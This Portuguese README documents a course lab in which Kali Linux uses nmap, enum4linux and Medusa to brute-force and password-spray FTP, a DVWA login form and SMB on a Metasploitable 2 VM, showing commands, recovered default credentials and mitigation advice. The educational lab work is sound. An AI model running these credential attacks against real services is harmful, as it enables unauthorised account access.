# Projeto: Simulação de Ataques de Força Bruta (Kali + Medusa)

**Resumo**

Este repositório documenta um laboratório prático de ataques de força bruta em ambiente controlado (Kali Linux atacando Metasploitable 2), usando a ferramenta **Medusa** para automatizar tentativas contra serviços FTP, formulário web (DVWA) e SMB. O objetivo foi entender as técnicas, evidenciar resultados e propor recomendações de mitigação.

---

## Índice

* [Objetivo](#objetivo)
* [Ambiente](#ambiente)
* [Pré-requisitos](#pré-requisitos)
* [Topologia e identificação do alvo](#topologia-e-identificação-do-alvo)
* [Wordlists usadas](#wordlists-usadas)
* [Comandos e passos executados](#comandos-e-passos-executados)

  * [Descoberta (Nmap)](#descoberta-nmap)
  * [Força bruta FTP (Medusa)](#força-bruta-ftp-medusa)
  * [Força bruta em formulário web (DVWA) com Medusa](#força-bruta-em-formulário-web-dvwa-com-medusa)
  * [Enumeração e password spraying SMB](#enumeração-e-password-spraying-smb)
* [Resultados e validação](#resultados-e-validação)
* [Recomendações de mitigação](#recomendações-de-mitigação)
* [Evidências e organização do repositório](#evidências-e-organização-do-repositório)
* [Como replicar este laboratório](#como-replicar-este-laboratório)
* [Aprendizados](#aprendizados)
* [Licença e agradecimentos](#licença-e-agradecimentos)

---

## Objetivo

* Demonstrar ataques de força bruta e password spraying em serviços comuns (FTP, web, SMB) em um ambiente isolado.
* Documentar as técnicas, comandos e resultados para fins educacionais.
* Propor medidas práticas de mitigação.

---

## Ambiente

* **Máquinas virtuais:** Kali Linux (atacante) + Metasploitable 2 (vítima)
* **VirtualBox:** rede configurada em *host-only* (ou *internal network*), IP do alvo: `192.168.56.104`.
* **Serviços observados no alvo (exemplo):** FTP (vsftpd), SSH, HTTP (DVWA), Samba (SMB), MySQL, etc.

> Observação: todo o teste foi realizado em ambiente controlado (Metasploitable) e destinado apenas a fins pedagógicos.

---

## Pré-requisitos

* VirtualBox instalado.
* Imagens/VMs: Kali Linux e Metasploitable 2.
* Ferramentas no Kali: `nmap`, `medusa`, `ftp`, `smbclient`, `enum4linux`.

---

## Topologia e identificação do alvo

Usei `ping` e `nmap` para confirmar conectividade e enumerar serviços.

Exemplo:

```bash
# Confirmação de conectividade
ping -c 3 192.168.56.104

# Scan rápido (portas abertas)
nmap 192.168.56.104

# Scan com detecção de versão para portas selecionadas
nmap -sV -p 21,22,80,139,445 192.168.56.104
```

Resultado resumido (capturado durante o laboratório): serviços FTP (vsftpd 2.3.4), HTTP (Apache), Samba (smbd 3.x) abertos.

---

## Wordlists usadas

Criei wordlists simples (apenas para fins de demonstração):

```bash
# usuários
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# senhas
echo -e "password\n123456\nadmin\nqwerty\nmsfadmin" > pass.txt
```

Para SMB, adaptei outra lista:

```bash
echo -e "user\nmsfadmin\nadmin\nservice" > smb_users.txt
echo -e "Welcome123\npassword\n123456\nadmin\nqwerty\nmsfadmin" > smb_pass.txt
```

> Dica: para testes mais robustos, use wordlists maiores (SecLists, RockYou, etc.), ajustando sempre ao escopo e ambiente controlado.

---

## Comandos e passos executados

### Descoberta (Nmap)

```bash
nmap 192.168.56.104
nmap -sV -p 21,22,80,139,445 192.168.56.104
```

### Força bruta FTP com Medusa

Comando usado para atacar FTP com lista de usuários e senhas:

```bash
medusa -h 192.168.56.104 -U users.txt -P pass.txt -M ftp -t 6
```

**Resultado relevante:**

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.104 User: msfadmin Password: msfadmin [SUCCESS]
```

Validação de acesso via cliente FTP:

```bash
ftp msfadmin@192.168.56.104
# inseri a senha: msfadmin
# após login: "230 Login successful."
```

### Força bruta em formulário web (DVWA) com Medusa

Configuração de ataque ao formulário de login do DVWA (tela `/dvwa/login.php`):

```bash
medusa -h 192.168.56.104 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

**Resultado relevante:**

```
ACCOUNT FOUND: [http] Host: 192.168.56.104 User: admin Password: password [SUCCESS]
```

> Observação: O parâmetro `-m FORM` utiliza placeholders `^USER^` e `^PASS^` para injetar credenciais.

### Enumeração e password spraying SMB

Coleta de informações com `enum4linux`:

```bash
enum4linux -a 192.168.56.104 | tee enum4_output.txt
```

Execução de password spraying contra SMB com Medusa (módulo `smbnt`):

```bash
medusa -h 192.168.56.104 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2 -T 50
```

**Resultado relevante:**

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.104 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

Após obter credenciais, listei shares com `smbclient`:

```bash
smbclient -L //192.168.56.104 -U msfadmin
# informei a senha: msfadmin
```

Saídas mostraram shares como `tmp`, `opt`, `msfadmin`, `ADMIN$`, etc.

---

## Resultados e validação

* **FTP:** login bem-sucedido com `msfadmin:msfadmin`.
* **DVWA (HTTP):** credenciais válidas encontradas `admin:password`.
* **SMB:** `msfadmin:msfadmin` com acesso administrativo (ADMIN$) e listagem de shares.

---

## Recomendações de mitigação

1. **Políticas de senha fortes:** exigir senhas complexas e senhas únicas por serviço; bloquear contas após N tentativas.
2. **Rate limiting / lockout:** bloquear ou desacelerar tentativas de login excessivas por IP/conta.
3. **Autenticação multifator (MFA):** impedir que credenciais roubadas sejam suficientes por si só.
4. **Monitoramento e alertas:** detectar picos de tentativas de autenticação e alertar equipes de segurança.
5. **Desativar serviços desnecessários:** ambientes de produção não devem expor serviços como telnet ou FTP sem necessidade.
6. **Configuração segura de serviços:** atualizar versões vulneráveis (ex.: vsftpd 2.3.4), aplicar patches e revisar configurações (ex.: desabilitar FTP anônimo).
7. **Uso de gerenciamento de credenciais e rotação:** evitar credenciais padrão e rotacioná-las periodicamente.

---

## Estrutura sugerida do repositório

```
README.md
/users.txt
/pass.txt
/smb_users.txt
/smb_pass.txt

```

> Atenção: não inclua senhas reais ou dados sensíveis se publicar em repositório público. No contexto deste laboratório as credenciais foram criadas/detectadas em VM controlada.

---

## Como replicar este laboratório (passo a passo curto)

1. Configure as VMs (Kali + Metasploitable) em VirtualBox na mesma rede host-only.
2. No Kali, crie as wordlists (`users.txt`, `pass.txt`).
3. Execute `nmap` para identificar serviços.
4. Execute os comandos `medusa` mostrados neste README para testar FTP, HTTP (DVWA) e SMB.
5. Valide acessos com `ftp`, `smbclient` ou acessando a interface do DVWA no navegador.

---

## Aprendizados

* Ferramentas como Medusa automatizam ataques de força bruta e permitem testar múltiplos serviços simultaneamente.
* Mesmo listas pequenas e credenciais padrão ainda funcionam em ambientes mal configurados.
* A combinação de enumeração (enum4linux, nmap) + brute force aumenta a chance de sucesso.

---

## Licença

Projeto educacional — use este material apenas em ambientes controlados e com permissão.

---

## Referências e Agradecimentos

* Metasploitable 2 (para ambiente intencionalmente vulnerável)
* Kali Linux
* Medusa (automatização de brute force)
* DVWA (Damn Vulnerable Web Application)
* Programa de Cibersegurança realizado pelo Santander em parceria com a DIO.

